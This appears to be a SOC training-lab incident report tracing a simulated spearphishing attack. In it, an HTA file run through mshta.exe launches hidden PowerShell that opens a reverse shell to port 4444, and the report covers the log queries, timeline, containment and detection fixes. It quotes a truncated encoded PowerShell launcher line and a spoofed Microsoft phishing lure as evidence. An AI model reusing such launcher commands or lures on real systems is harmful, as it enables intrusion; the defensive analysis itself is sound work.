# Case 001 — Initial Compromise Investigation

## 1. Case Summary
During active security monitoring of the enterprise environment, the Security Operations Center (SOC) detected a multi-stage intrusion attempt targeting an internal technical workstation (`IT-ADMIN01`, `10.10.35.18`). ArcSight ESM generated a Critical (Severity 9) correlation alert, `SOC-LAB C01 Initial Compromise Correlation`, indicating that a suspicious file download from an external entity was immediately followed by living-off-the-land script execution (`mshta.exe`) and an outbound command-and-control (C2) callback over a non-standard port (`TCP/4444`). 

Tier-2 SOC analysts executed a structured digital investigation using ArcSight Logger, pivoting across network intrusion prevention (Suricata), endpoint auditing (Sysmon Event ID 1 & 3), network session metadata (Zeek), and mail gateway logs (Postfix). The investigation confirmed that the attacker successfully established an interactive reverse shell foothold following a spearphishing email lure. Containment was enacted, terminating rogue processes, isolating the affected workstation, and hardening ingress file associations.

---

## 2. Investigation Objective
1. Validate whether the `C01` correlation alert represents a verified true-positive breach or an anomalous administrative false alarm.
2. Reconstruct the complete initial access trajectory: determine the ingress delivery vector, downloaded artifacts, and payload execution chain.
3. Verify whether the outbound network connection (`TCP/4444`) succeeded and establish if an interactive command shell was granted to the external adversary.
4. Establish the exact timeline ($T_0$) to anchor subsequent investigations into post-exploitation activity.
5. Execute immediate containment and formulate detection engineering improvements.

---

## 3. Initial Alert
* **Alert Trigger**: `SOC-LAB C01 Initial Compromise Correlation`
* **Detection Engine**: ArcSight ESM Real-Time Correlation Engine
* **Severity**: `9 / 10 (Critical)`
* **Timestamp**: $T_0$ (Reference Anchor)
* **Affected Asset**: `10.10.35.18` (`IT-ADMIN01`, Internal Core Network)
* **External Threat Actor**: `203.0.113.25` (`Kali`, External Network)
* **Alert Logic**: In-memory stateful join matching atomic detections `A02` (Ingress Download), `A03` (Host Execution), and `A04` (Network Callback) on matching host `10.10.35.18` within a sliding window of $\Delta t \le 20\text{ minutes}$.

---

## 4. Initial Evidence
The raw ESM correlation alert payload bundled three constituent events:
1. **Network Ingress Event (`A02`)**: Suricata IPS custom signature SID `1101002` (`"SOCLAB SUSPICIOUS Inbound Download from External Web"`) triggered at $T_0 - 2\text{m}$, recording an HTTP GET request for `SecurityPatch_KB504991.zip` from `203.0.113.25:80`.
2. **Endpoint Execution Event (`A03`)**: Microsoft Sysmon Event ID 1 (Process Create) logged at $T_0 - 1\text{m}$, recording `C:\Windows\System32\mshta.exe` executing an `.hta` file from the user's Downloads directory.
3. **Network Egress Callback Event (`A04`)**: Zeek `conn.log` session metadata at $T_0$, recording a persistent TCP connection from `10.10.35.18:49211` to `203.0.113.25:4444`.

---

## 5. Investigation Hypotheses

| Hypothesis ID | Formulation | Validation Status | Evidence Base |
| :--- | :--- | :---: | :--- |
| **H1** | The downloaded archive `SecurityPatch_KB504991.zip` was extracted and executed on `IT-ADMIN01`. | **SUPPORTED** | Sysmon Event ID 1 confirms `mshta.exe` executing `SecurityPatch_KB504991.hta`. |
| **H2** | The executing script spawned secondary shells and granted an interactive C2 session to the external adversary. | **SUPPORTED** | Process tree analysis reveals `mshta.exe` $\rightarrow$ `cmd.exe` $\rightarrow$ `powershell.exe` establishing an active socket. |
| **H3** | The network callback (`TCP/4444`) is directly bound to the spawned PowerShell process. | **SUPPORTED** | Sysmon Event ID 3 links destination `203.0.113.25:4444` to the exact `ProcessGuid` of `powershell.exe`. |
| **H4** | The malicious payload was introduced via unmonitored physical media (USB) or direct file share. | **NOT SUPPORTED** | Backtracking telemetry links the download URL directly to an inbound spearphishing email delivered via Postfix. |

---

## 6. Investigation Method
The investigation utilized a **Trigger-Driven Decoupled Forensic Workflow**:
1. **ESM Alert Triaging**: Validate the integrity of correlation rule `C01` and verify that the three composite events share identical entity keys (`10.10.35.18`).
2. **Logger Deep Search**: Establish a narrow search window ($T_0 - 10\text{m}$ to $T_0 + 10\text{m}$) on ArcSight Logger to extract high-fidelity process and network telemetry.
3. **Genealogical Process Tracking**: Trace parent-child process relationships using Sysmon `ProcessGuid` and `ParentProcessGuid` to defeat Process ID (PID) recycling.
4. **Session Cross-Referencing**: Correlate Zeek network flow records with Sysmon Event ID 3 network connections using source IP, destination IP, and destination port.
5. **Ingress Backtracking**: Search antecedent mail server logs to identify the initial delivery mechanism.

---

## 7. Evidence Pivot 1: Endpoint Process Lineage (`A03`)
* **Objective**: Determine the origin of the `mshta.exe` execution and identify all spawned child processes.
* **Logger Query**:
  ```text
  deviceProduct="Microsoft-Windows-Sysmon" AND destinationProcessName="C:\\Windows\\System32\\mshta.exe" AND deviceHostName="IT-ADMIN"
  ```
* **Observed Artifacts**:
  * Sysmon Event ID 1 confirms execution at $T_0 - 1\text{m} 45\text{s}$.
  * Target File: `C:\Users\admin\Downloads\SecurityPatch_KB504991.hta`.
  * Process Identifier: `ProcessGuid = {ecec360d-d71c-6aab-3400-000000001800}`.
  * Parent Process: `C:\Windows\explorer.exe` (`ProcessGuid = {ecec360d-d6a1-6aab-1200-000000001800}`).
* **Child Process Expansion Query**:
  ```text
  deviceProduct="Microsoft-Windows-Sysmon" AND (deviceCustomString5="{ecec360d-d71c-6aab-3400-000000001800}" OR message CONTAINS "{ecec360d-d71c-6aab-3400-000000001800}")
  ```
* **Result**:
  `mshta.exe` immediately spawned `C:\Windows\System32\cmd.exe /c`, which subsequently executed:
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA...
  ```
* **Analytic Conclusion**: The user manually double-clicked the extracted `.hta` file from Windows Explorer. The HTA script executed a heavily obfuscated PowerShell command line designed to bypass execution policies and suppress user visibility.

---

## 8. Evidence Pivot 2: Network C2 Session Correlation (`A04`)
* **Objective**: Confirm whether the obfuscated PowerShell process successfully connected to the external listener on `203.0.113.25:4444`.
* **Logger Query**:
  ```text
  deviceProduct="Microsoft-Windows-Sysmon" AND externalId=3 AND destinationAddress=203.0.113.25 AND destinationPort=4444
  ```
* **Observed Artifacts**:
  * Sysmon Event ID 3 confirms an outbound network connection established at $T_0 - 1\text{m} 10\text{s}$.
  * Initiating Process: `powershell.exe` with `ProcessGuid = {ecec360d-d720-6aab-3600-000000001800}`.
  * Source: `10.10.35.18:49211` $\rightarrow$ Destination: `203.0.113.25:4444`.
* **Zeek NDR Cross-Verification Query**:
  ```text
  deviceProduct="Zeek" AND transportProtocol="TCP" AND destinationPort=4444 AND sourceAddress=10.10.35.18
  ```
* **Result**:
  Zeek `conn.log` records a persistent TCP stream (`ZeekUID = C9xKa811`). Connection duration exceeded 1800 seconds with continuous bidirectional byte exchange (`orig_bytes: 48,210`, `resp_bytes: 124,890`).
* **Analytic Conclusion**: The PowerShell command established an active, interactive TCP reverse shell back to the adversary. The persistent connection confirmed full remote command execution capability on `IT-ADMIN01`.

---

## 9. Evidence Pivot 3: Ingress Backtracking to Email Lure (`A01` & `A02`)
* **Objective**: Trace the origin of `SecurityPatch_KB504991.zip` to determine how the lure was introduced into the environment.
* **Suricata Ingress Query**:
  ```text
  deviceProduct="Suricata IDS IPS" AND deviceCustomNumber1=1101002 AND sourceAddress=10.10.35.18
  ```
* **Observation**: Suricata EVE JSON confirms HTTP GET request to `http://update.kali.test/SecurityPatch_KB504991.zip` at $T_0 - 2\text{m} 30\text{s}$.
* **Mail Gateway Pivot Query**:
  ```text
  deviceProduct="Postfix" AND destinationUserName="user01@soclab.test"
  ```
* **Result**:
  At $T_0 - 8\text{m}$, Postfix mail logs on `MAIL01` (`10.10.34.14`) record an inbound SMTP message from external IP `203.0.113.25`:
  * Sender: `security@microsoft.com`
  * Recipient: `user01@soclab.test`
  * Subject: `"URGENT: Critical Security Update KB504991"`
  * Queue ID: `718FC8006A`
  * Action: `status=sent (delivered to maildir)`
* **Analytic Conclusion**: The attack originated from an external spearphishing email delivered to `user01`. The victim followed a phishing link within the email, downloading the malicious archive via the web browser.

---

## 10. Timeline of Events

```text
[T0 - 8m 00s]  MAIL01: Postfix accepts email (QueueID: 718FC8006A) from security@microsoft.com to user01.
[T0 - 2m 30s]  SURICATA: SID 1101002 fires; IT-ADMIN01 downloads SecurityPatch_KB504991.zip from 203.0.113.25.
[T0 - 1m 45s]  SYSMON: explorer.exe launches mshta.exe executing SecurityPatch_KB504991.hta (Event ID 1).
[T0 - 1m 40s]  SYSMON: mshta.exe spawns cmd.exe /c, which launches hidden powershell.exe with encoded payload.
[T0 - 1m 10s]  SYSMON: powershell.exe initiates network connection to 203.0.113.25:4444 (Event ID 3).
[T0 - 1m 08s]  ZEEK: conn.log establishes persistent TCP session C9xKa811 on port 4444.
[T0 - 0m 00s]  ESM: Composite correlation rule C01 fires, generating Critical P1 Incident Alert.
```

---

## 11. Reconstructed Attack Chain
```text
1. Delivery (Phishing)    ──► Postfix Queue ID: 718FC8006A (security@microsoft.com)
2. Ingress Download       ──► HTTP GET SecurityPatch_KB504991.zip (Suricata SID 1101002)
3. Script Execution       ──► Windows Explorer ──► mshta.exe ──► SecurityPatch_KB504991.hta
4. Process Masquerading   ──► mshta.exe ──► cmd.exe ──► powershell.exe (-ExecutionPolicy Bypass)
5. C2 Session Established ──► PowerShell connects to 203.0.113.25:4444 (Reverse Shell Foothold)
```

---

## 12. Detection Coverage Analysis

| Detection ID | Fired? | Evidence Found | Operational Role in Investigation | Known Detection Limitations |
| :--- | :---: | :--- | :--- | :--- |
| **A01** | **YES** | QueueID `718FC8006A`, `status=sent` | Contextual Anchor: Backtracks delivery path | Cannot verify if email body contains malicious URL |
| **A02** | **YES** | Suricata SID `1101002` HTTP alert | Primary Ingress Pivot: Identifies download IP/URL | Blind if traffic is encrypted over HTTPS without SSL inspection |
| **A03** | **YES** | Sysmon Event 1 (`mshta.exe`) | Execution Pivot: Establishes malicious process tree | Dependent on endpoint agent presence and Sysmon XML rules |
| **A04** | **YES** | Zeek `conn.log` TCP session `:4444` | Network Callback Pivot: Confirms persistent C2 | Generates excessive alert volume during long sessions |
| **C01** | **YES** | ESM Correlated Event (Severity 9) | Incident Dispatch: Triages high-fidelity threat | Limited by 20-minute sliding correlation window |

---

## 13. Detection Gaps & Blind Spots
1. **Encrypted Web Delivery Gap**: Detection `A02` fired because the payload was transferred over cleartext HTTP. If the adversary had hosted the ZIP archive on an HTTPS server, Suricata would only have observed TLS handshake metadata without file URI inspection.
2. **Temporal Evasion Risk in C01**: The ESM correlation rule requires all three steps (`A02` $\rightarrow$ `A03` $\rightarrow$ `A04`) to occur within 20 minutes. If the payload had incorporated a 30-minute delay before beaconing out, `C01` would not have fired automatically, leaving only isolated atomic alerts.
3. **Alert Volume Saturation (`A04`)**: The persistent reverse shell generated repeated connection state updates on Zeek and ESM, risking operator alert fatigue if not properly suppressed.

---

## 14. Impact Assessment
* **Confidentiality**: **HIGH RISK**. Attacker obtained interactive shell access on an IT administrator workstation with local administrative privileges.
* **Integrity**: **COMPROMISED**. Workstation filesystem compromised; arbitrary scripts executed with user credentials.
* **Availability**: **NORMAL**. Infrastructure services remained operational during this phase.
* **Blast Radius**: Initially confined to workstation `10.10.35.18`. However, stored credentials and network routes accessible from this host present severe lateral movement risks across the Internal network.

---

## 15. Containment & Remediation Actions

```text
┌─────────────────────────────────┬─────────────────────────────────┬─────────────────────────────────┐
│ CONTAINMENT ACTION              │ EXECUTION EVIDENCE              │ VALIDATION METHOD               │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 1. Host Network Isolation       │ Disconnected vSwitch port group │ Ping and TCP SYN packets to     │
│                                 │ for IT-ADMIN01 (10.10.35.18)    │ 10.10.35.18 dropped at gateway. │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 2. Malicious Process Kill       │ Terminated PID corresponding to │ Sysmon Event ID 5 (Process      │
│                                 │ rogue powershell.exe & mshta.exe│ Terminate) confirms execution.  │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 3. Perimeter Egress Blocking    │ Added pfSense firewall rule     │ Filterlog verifies all outbound │
│                                 │ blocking TCP/4444 outbound      │ SYN to port 4444 are DENIED.    │
├─────────────────────────────────┼─────────────────────────────────┼─────────────────────────────────┤
│ 4. Artifact Removal             │ Purged SecurityPatch_KB504991.* │ Filesystem audit confirms path  │
│                                 │ from C:\Users\admin\Downloads\  │ empty.                          │
└─────────────────────────────────┴─────────────────────────────────┴─────────────────────────────────┘
```

---

## 16. Lessons Learned
1. **Living-off-the-Land Binaries (LOLBins)**: Relying solely on perimeter AV signatures is insufficient. `mshta.exe` is a legitimate Microsoft binary routinely abused to proxy malicious script execution.
2. **Decoupled Architecture Value**: ArcSight ESM identified the pattern instantaneously without bogging down in log storage, while Logger allowed analysts to reconstruct the entire parent-child process tree in under five minutes.
3. **Endpoint Visibility is Non-Negotiable**: Without Sysmon Event ID 1 (`CommandLine`, `ParentProcessGuid`) and Event ID 3, network NDR alone could not prove whether the outbound TCP connection was benign or an active reverse shell.

---

## 17. Detection Improvements
1. **ESM Active Channel Tuning**: Implemented a triage filter rule (`Name != A04*`) on the main monitoring console to prevent active reverse shells from flooding the display.
2. **GPO File Association Hardening**: Modified Group Policy to de-associate the `.hta` extension from `mshta.exe`, defaulting to Notepad for unprivileged opening.
3. **Correlation Window Optimization**: Proposed a secondary long-window correlation rule ($\Delta t \le 12\text{ hours}$) with lower threshold weights to detect delayed beaconing techniques.

---

## 18. Investigation Limitations
1. **Encrypted PowerShell Payload**: The payload inside `powershell.exe -enc` was executed in memory. While ScriptBlock Logging (4104) captured the de-obfuscated script text, full memory dump forensics was not performed prior to process termination.
2. **Mail Content Visibility**: Postfix logs confirm sender, recipient, and Queue ID, but email body text is not preserved in syslog telemetry for privacy reasons.

---

## 19. Final Assessment
Case 001 represents a confirmed, critical security breach. A targeted spearphishing attack successfully established an interactive command shell on internal workstation `IT-ADMIN01`. Real-time multi-source correlation (`C01`) ensured detection within 1 minute of callback. Containment effectively halted the initial foothold, providing the anchor timeline for subsequent investigation into attacker reconnaissance.

---

## 20. Evidence References
* **Primary Report**: `Báo cáo đề tài SOC.pdf`, Trang 75–80, 91–94, 107–108, 124–128.
* **Architecture Runbook**: `toan-bo-he-thong-kien_truc_lab.txt`, Mục 50–55.
* **Logger Evidence Artifacts**: EV-01, EV-02, EV-03.

---

## 21. Related Visual & Evidentiary Assets

### Architecture & Forensic Workflow Diagrams
* [**Enterprise SOC Overview Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/enterprise-soc-overview.svg): High-level system architecture and network boundary placements.
* [**Network Security Flow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/network-security-flow.svg): Perimeter ingress/egress filtering and multi-zone segmentation.
* [**Telemetry Pipeline Flow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/telemetry-flow.svg): Postfix, Suricata, and Sysmon event normalization into ArcSight Connector.
* [**Detection Dependency Flow Diagram**](file:///e:/project_ca_nhan/lab_cty/architecture/detection-flow.svg): Multi-source stateful correlation model for rule `C01`.
* [**Case 001 Forensic Investigation Flowchart**](file:///e:/project_ca_nhan/lab_cty/investigation/case-001/investigation-flow.mmd): Sequence diagram of analyst pivots from Active Channel to Postfix.

### Curated Evidence Manifests
* [**DET-001 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/detection/README.md#det-001): Atomic detection rule `A02` (Suricata SID 1101002 payload download).
* [**DET-002 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/detection/README.md#det-002): Atomic detection rule `A03` (Sysmon Living-off-the-Land `mshta.exe` execution).
* [**DET-003 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/detection/README.md#det-003): Atomic detection rule `A04` (Outbound TCP port 4444 callback session).
* [**DET-004 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/detection/README.md#det-004): Composite correlation rule `C01` (ArcSight ESM multi-source correlation).
* [**INV-001 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/investigation/README.md#inv-001): Mail delivery log backtracking on `MAIL01` (Postfix QueueID `718FC8006A`).
* [**INV-002 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/investigation/README.md#inv-002): Endpoint process tree expansion (`explorer.exe` $\rightarrow$ `mshta.exe` $\rightarrow$ `cmd.exe` $\rightarrow$ `powershell.exe`).
* [**TEL-001 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/telemetry/README.md#tel-001): Microsoft Sysmon endpoint telemetry configuration and XML rule definitions.
* [**TEL-003 Manifest**](file:///e:/project_ca_nhan/lab_cty/evidence/telemetry/README.md#tel-003): Suricata IPS network sensor configuration and EVE JSON logging format.
* [**Sanitized ESM Console Evidence**](file:///e:/project_ca_nhan/lab_cty/evidence/sanitized/README.md#sanitized-evidence-card-arcsight-esm-active-channel-c01-initial-compromise): Sanitized view of ESM Active Channel grid.

### Demonstration & Investigation Videos
* [**VIDEO-01: Attack Simulation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/attack-simulation/VIDEO-01.md): Full multi-stage adversary execution, generating the initial spearphishing and reverse shell triggers.
* [**VIDEO-02: Full Incident Investigation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-02-FULL.md): Primary screen recording of analyst triage, Logger search queries, and host containment.
* [**VIDEO-03: Supplementary Investigation Walkthrough**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-03-SUPPLEMENT.md): Technical deep-dive on low-level telemetry, script block decoding, and secondary pivots.

---

## 22. Video Demonstration

* **Hosting:** YouTube  
* **Visibility:** Unlisted  
* **Status:** Pending Upload  
* **URL:** `YOUTUBE_URL_PENDING`  
* **Demonstration Documents:**
  * Primary Walkthrough: [**`VIDEO-02-FULL.md`**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-02-FULL.md)
  * Deep Forensics Companion: [**`VIDEO-03-SUPPLEMENT.md`**](file:///e:/project_ca_nhan/lab_cty/media/investigation/VIDEO-03-SUPPLEMENT.md)

Under the unified laboratory incident workflow, this case study's triage is demonstrated within **Video 02** (Full Incident Investigation Walkthrough), tracking initial alert triage in ArcSight ESM (`C01`), process lineage expansion via Sysmon `ProcessGuid`, network callback correlation with Zeek, and email backtracking in Postfix. Detailed secondary forensics and script block de-obfuscation are elaborated in **Video 03** (Supplementary Walkthrough).


